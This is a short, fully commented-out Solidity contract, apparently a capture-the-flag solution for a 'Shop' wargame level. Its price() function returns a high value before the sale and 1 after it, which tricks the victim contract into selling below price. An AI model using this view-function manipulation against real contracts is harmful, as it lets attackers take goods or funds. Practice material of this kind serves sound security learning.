// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import './Task.sol';

// contract ShopSolution {

//     Shop public victim;

//     constructor(address _shop) {
//         victim = Shop(_shop);

//     }

//     function getVictimStatus () public view returns (bool) {
//         return victim.isSold();
//     }

//     function price() external view returns (uint) {
//         if (victim.isSold()) {
//             return 1;
//         }
//             return 2000;
//     }

//     function attackBuy() public {
//         victim.buy();
//     }

// }